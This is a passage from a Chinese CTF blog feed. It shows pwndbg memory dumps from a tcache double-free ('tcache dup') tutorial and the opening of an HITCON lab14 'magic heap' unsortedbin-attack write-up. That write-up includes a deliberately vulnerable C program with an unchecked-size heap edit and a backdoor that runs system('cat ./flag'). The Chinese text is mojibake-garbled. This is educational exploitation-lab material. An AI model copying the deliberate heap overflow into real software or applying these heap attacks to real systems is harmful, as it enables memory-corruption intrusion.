class="hljs-params">(çœç•¥å†…å®¹å‡ä¸ºç©º)</span><br>0x601250:0x00000000000000000x0000000000000021 #chunk1<br>0x601260:0x00000000006012600x0000000000000000<br>0x601270:0x00000000000000000x0000000000020d91 #top_chunk<br>......<span class="hljs-params">(çœç•¥å†…å®¹å‡ä¸ºç©º)</span><br>0x601310:0x00000000000000000x0000000000000000<br>pwndbg&gt; bin<br>tcachebins<br>0x20 [  2]: 0x601260 â—‚â€” 0x601260<br>fastbins<br>0x20: 0x0<br>0x30: 0x0<br>0x40: 0x0<br>0x50: 0x0<br>0x60: 0x0<br>0x70: 0x0<br>0x80: 0x0<br>unsortedbin<br>all: 0x0<br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; x/16gx &amp;main_arena<br>0x7ffff7dcfc40 &lt;main_arena&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc50 &lt;main_arena+16&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc60 &lt;main_arena+32&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc70 &lt;main_arena+48&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc80 &lt;main_arena+64&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc90 &lt;main_arena+80&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfca0 &lt;main_arena+96&gt;:0x00000000006012700x0000000000000000<br>    #æŒ‡å‘top_chunk<br>0x7ffff7dcfcb0 &lt;main_arena+112&gt;:0x00007ffff7dcfca00x00007ffff7dcfca0<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>ä»ä¸Šé¢çš„å†…å­˜ä¸­å¯ä»¥çœ‹å‡ºï¼Œå¯¹chunk1è¿›è¡Œä¸¤æ¬¡freeä¹‹åï¼Œåœ¨tcacheä¸­å½¢æˆäº†cyclical listï¼Œä¹Ÿå°±æ˜¯è¯´chunk1ä¸­çš„nextæŒ‡é’ˆæŒ‡å‘å…¶æœ¬èº«çš„chunk_dataã€‚<br>ç”±äºæ¥ä¸‹æ¥æœ‰ä¸¤æ¬¡mallocï¼Œå› æ­¤å…ˆæ¥çœ‹ç¬¬ä¸€æ¬¡mallocä¹‹åçš„å†…å­˜ï¼Œå¯¹mallocä¸‹æ–­ç‚¹ï¼š<br>å‘½ä»¤ï¼šb malloc<br>ç»§ç»­è°ƒè¯•ç¨‹åºï¼Œç”±äºå¯¹mallocä¸‹æ–­ç‚¹ï¼Œå› æ­¤ç¨‹åºä¼šåœåœ¨mallocçš„push rbpï¼Œä¹Ÿå°±æ˜¯è¯´ç¨‹åºå¹¶æ²¡æœ‰è¿›è¡Œç¬¬ä¸€æ¬¡mallocï¼Œå› æ­¤æˆ‘ä»¬è¾“å…¥cç»§ç»­è¿è¡Œç¨‹åºï¼Œç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br><br>Free <span class="hljs-title function_">chunk</span> <span class="hljs-params">(tcache)</span> | PREV_INUSE<br>Addr: 0x601250<br>Size: 0x21<br>fd: 0x601260<br><br>Top chunk | PREV_INUSE<br>Addr: 0x601270<br>Size: 0x20d91<br><br>pwndbg&gt; bin<br>tcachebins<br>0x20 [  1]: 0x601260 â—‚â€” 0x601260<br>fastbins<br>0x20: 0x0<br>0x30: 0x0<br>0x40: 0x0<br>0x50: 0x0<br>0x60: 0x0<br>0x70: 0x0<br>0x80: 0x0<br>unsortedbin<br>all: 0x0<br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: 0x601000<br>Size: 0x251<br><br>Free <span class="hljs-title function_">chunk</span> <span class="hljs-params">(tcache)</span> | PREV_INUSE<br>Addr: 0x601250<br>Size: 0x21<br>fd: 0x601260<br><br>Top chunk | PREV_INUSE<br>Addr: 0x601270<br>Size: 0x20d91<br><br>pwndbg&gt; x/100gx 0x601000<br>0x601000:0x00000000000000000x0000000000000251 #tcache_perthread_struct<br>0x601010:0x00000000000000010x0000000000000000<br>    <span class="hljs-meta">#count=1</span><br>0x601020:0x00000000000000000x0000000000000000<br>0x601030:0x00000000000000000x0000000000000000<br>0x601040:0x00000000000000000x0000000000000000<br>0x601050:0x00000000006012600x0000000000000000<br>......ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br>0x601250:0x00000000000000000x0000000000000021 #chunk1<br>0x601260:0x00000000006012600x0000000000000000<br>0x601270:0x00000000000000000x0000000000020d91 #top_chunk<br>......ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br>0x601310:0x00000000000000000x0000000000000000<br>pwndbg&gt; bin<br>tcachebins<br>0x20 [  1]: 0x601260 â—‚â€” 0x601260<br>fastbins<br>0x20: 0x0<br>0x30: 0x0<br>0x40: 0x0<br>0x50: 0x0<br>0x60: 0x0<br>0x70: 0x0<br>0x80: 0x0<br>unsortedbin<br>all: 0x0<br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; x/16gx &amp;main_arena<br>0x7ffff7dcfc40 &lt;main_arena&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc50 &lt;main_arena+16&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc60 &lt;main_arena+32&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc70 &lt;main_arena+48&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc80 &lt;main_arena+64&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc90 &lt;main_arena+80&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfca0 &lt;main_arena+96&gt;:0x00000000006012700x0000000000000000<br>    #æŒ‡å‘top_chunk<br>0x7ffff7dcfcb0 &lt;main_arena+112&gt;:0x00007ffff7dcfca00x00007ffff7dcfca0<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>ä¸ºäº†é˜²æ­¢ç¨‹åºè·‘é£ï¼Œæ¥ä¸‹æ¥å¯¹ä»£ç çš„ç¬¬17è¡Œä¸‹æ–­ç‚¹ï¼Œçœ‹ä¸€ä¸‹ç¬¬äºŒæ¬¡mallocä¹‹åçš„ç»“æœï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x601000</span><br>Size: <span class="hljs-number">0x251</span><br><br>Free <span class="hljs-title function_">chunk</span> <span class="hljs-params">(tcache)</span> | PREV_INUSE<br>Addr: 0x601250<br>Size: 0x21<br>fd: 0x601260<br><br>Top chunk | PREV_INUSE<br>Addr: 0x601270<br>Size: 0x20d91<br><br>pwndbg&gt; bin<br>tcachebins<br>0x20 [  0]: 0x601260 â—‚â€” ...<br>fastbins<br>0x20: 0x0<br>0x30: 0x0<br>0x40: 0x0<br>0x50: 0x0<br>0x60: 0x0<br>0x70: 0x0<br>0x80: 0x0<br>unsortedbin<br>all: 0x0<br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; x/16gx &amp;main_arena<br>0x7ffff7dcfc40 &lt;main_arena&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc50 &lt;main_arena+16&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc60 &lt;main_arena+32&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc70 &lt;main_arena+48&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc80 &lt;main_arena+64&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfc90 &lt;main_arena+80&gt;:0x00000000000000000x0000000000000000<br>0x7ffff7dcfca0 &lt;main_arena+96&gt;:0x00000000006012700x0000000000000000<br>0x7ffff7dcfcb0 &lt;main_arena+112&gt;:0x00007ffff7dcfca00x00007ffff7dcfca0<br>pwndbg&gt; x/100gx 0x601000<br>0x601000:0x00000000000000000x0000000000000251 #tcache_perthread_struct <br>0x601010:0x00000000000000000x0000000000000000<br>0x601020:0x00000000000000000x0000000000000000<br>0x601030:0x00000000000000000x0000000000000000<br>0x601040:0x00000000000000000x0000000000000000<br>0x601050:0x00000000006012600x0000000000000000<br>    #æ‰§è¡Œchunk1_data<br>......<span class="hljs-params">(çœç•¥å†…å®¹å‡ä¸ºç©º)</span><br>0x601250:0x00000000000000000x0000000000000021 #chunk1<br>0x601260:0x00000000006012600x0000000000000000<br>0x601270:0x00000000000000000x0000000000020d91 #top_chunk<br>......<span class="hljs-params">(çœç•¥å†…å®¹å‡ä¸ºç©º)</span> <br>0x601310:0x00000000000000000x0000000000000000<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>ä¸Šé¢å°±æ˜¯tcache_dupçš„æ”»å‡»æ–¹å¼ï¼Œçœ‹èµ·æ¥å¥½åƒæ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œä¸‹ç¯‡æ–‡ç« ä¸­çš„ä¾‹å­ä¼šä½“ç°ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Tcache-Attackä¸­çš„Tcache-dupï¼ˆåŸºç¡€ï¼‰&quot;&gt;&lt;a href=&quot;#Tcache-Attackä¸­çš„Tcache-dupï¼ˆåŸºç¡€ï¼‰&quot; class=&quot;headerlink&quot; title=&quot;Tcache Attackä¸­çš„Tcache dupï¼ˆåŸºç¡€ï¼‰&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="Tcache bin Attack" scheme="https://kylinxin.github.io/tags/Tcache-bin-Attack/"/>
    
  </entry>
  
  <entry>
    <title>HITCON Training lab14 magic heap</title>
    <link href="https://kylinxin.github.io/2023/09/15/HITCON%20Training%20lab14%20magic%20heap/"/>
    <id>https://kylinxin.github.io/2023/09/15/HITCON%20Training%20lab14%20magic%20heap/</id>
    <published>2023-09-15T04:58:29.000Z</published>
    <updated>2023-09-13T15:02:03.029Z</updated>
    
    <content type="html"><![CDATA[<h1 id="unsortedbin-attackï¼ˆä¾‹é¢˜ï¼‰"><a href="#unsortedbin-attackï¼ˆä¾‹é¢˜ï¼‰" class="headerlink" title="unsortedbin_attackï¼ˆä¾‹é¢˜ï¼‰"></a><strong>unsortedbin_attackï¼ˆä¾‹é¢˜ï¼‰</strong></h1><h2 id="æŸ¥çœ‹ä¿æŠ¤"><a href="#æŸ¥çœ‹ä¿æŠ¤" class="headerlink" title="æŸ¥çœ‹ä¿æŠ¤"></a>æŸ¥çœ‹ä¿æŠ¤</h2><p class='item-img' data-src='https://s2.loli.net/2023/09/13/AfgB9YjLMT6Sbxv.png'><img src="https://s2.loli.net/2023/09/13/AfgB9YjLMT6Sbxv.png" alt="Snipaste_2023-09-13_21-07-19.png"></p><p>æ–‡ä»¶æ²¡å¼€PIEï¼Œgotè¡¨å¯å†™ï¼Œå¼€å¯äº†Canaryå’ŒNXä¿æŠ¤ï¼Œ64ä½ç¨‹åºã€‚</p><h2 id="ç¨‹åºæºä»£ç "><a href="#ç¨‹åºæºä»£ç " class="headerlink" title="ç¨‹åºæºä»£ç "></a>ç¨‹åºæºä»£ç </h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">read_input</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size)</span> {<br>  <span class="hljs-type">int</span> ret;<br>  ret = read(<span class="hljs-number">0</span>, buf, size);<br>  <span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Error"</span>);<br>    _exit(<span class="hljs-number">-1</span>);<br>  }<br>}<br><br><span class="hljs-type">char</span> *heaparray[<span class="hljs-number">10</span>];<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> magic = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span> {<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"       Magic Heap Creator       "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 1. Create a Heap               "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 2. Edit a Heap                 "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 3. Delete a Heap               "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">" 4. Exit                        "</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"--------------------------------"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your choice :"</span>);<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_heap</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>];<br>  <span class="hljs-type">size_t</span> size = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {<br>    <span class="hljs-keyword">if</span> (!heaparray[i]) {<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size of Heap : "</span>);<br>      read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8</span>);<br>      size = atoi(buf);<br>      heaparray[i] = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>      <span class="hljs-keyword">if</span> (!heaparray[i]) {<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Allocate Error"</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);<br>      }<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap:"</span>);<br>      read_input(heaparray[i], size);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"SuccessFul"</span>);<br>      <span class="hljs-keyword">break</span>;<br>    }<br>  }<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit_heap</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">int</span> idx;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>];<br>  <span class="hljs-type">size_t</span> size;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index :"</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);<br>  idx = atoi(buf);<br>  <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt;= <span class="hljs-number">10</span>) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Out of bound!"</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  }<br>  <span class="hljs-keyword">if</span> (heaparray[idx]) {<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Size of Heap : "</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8</span>);<br>    size = atoi(buf);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Content of heap : "</span>);<br>    read_input(heaparray[idx], size);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done !"</span>);<br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such heap !"</span>);<br>  }<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">delete_heap</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">int</span> idx;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>];<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index :"</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);<br>  idx = atoi(buf);<br>  <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt;= <span class="hljs-number">10</span>) {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Out of bound!"</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  }<br>  <span class="hljs-keyword">if</span> (heaparray[idx]) {<br>    <span class="hljs-built_in">free</span>(heaparray[idx]);<br>    heaparray[idx] = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done !"</span>);<br>  } <span class="hljs-keyword">else</span> {<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"No such heap !"</span>);<br>  }<br>}<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">l33t</span><span class="hljs-params">()</span> { system(<span class="hljs-string">"cat ./flag"</span>); }<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>];<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {<br>    menu();<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">switch</span> (atoi(buf)) {<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      create_heap();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>      edit_heap();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>      delete_heap();<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4869</span>:<br>      <span class="hljs-keyword">if</span> (magic &gt; <span class="hljs-number">4869</span>) {<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Congrt !"</span>);<br>        l33t();<br>      } <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"So sad !"</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid Choice"</span>);<br>      <span class="hljs-keyword">break</span>;<br>    }<br>  }<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br><br></code></pre></td></tr></tbody></table></figure><h2 id="IDAé™æ€åˆ†æ"><a href="#IDAé™æ€åˆ†æ" class="headerlink" title="IDAé™æ€åˆ†æ"></a>IDAé™æ€åˆ†æ</h2><h3 id="main-å‡½æ•°"><a href="#main-å‡½æ•°" class="headerlink" title="main å‡½æ•°"></a>main å‡½æ•°</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>{<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    {<br>      menu();<br>      read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>      v3 = atoi(buf);<br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">3</span> )<br>        <span class="hljs-keyword">break</span>;<br>      delete_heap();<br>    }<br>    <span class="hljs-keyword">if</span> ( v3 &gt; <span class="hljs-number">3</span> )<br>    {<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">4</span> )<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">4869</span> )<br>      {<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)magic &lt;= <span class="hljs-number">4869</span> )<br>        {<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">"So sad !"</span>);<br>        }<br>        <span class="hljs-keyword">else</span><br>        {<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Congrt !"</span>);<br>          l33t();<br>        }<br>      }<br>      <span class="hljs-keyword">else</span><br>      {<br>LABEL_17:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid Choice"</span>);<br>      }<br>    }<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">1</span> )<br>    {<br>      create_heap();<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">2</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_17;<br>      edit_heap();<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>çœ‹ä¸€çœ‹å°±è¡Œï¼Œæ¥ä¸‹æ¥çœ‹å…·ä½“å‡½æ•°åŠŸèƒ½</p><h3 id="l33t-å­˜åœ¨åé—¨å‡½æ•°"><a href="#l33t-å­˜åœ¨åé—¨å‡½æ•°" class="headerlink" title="l33t 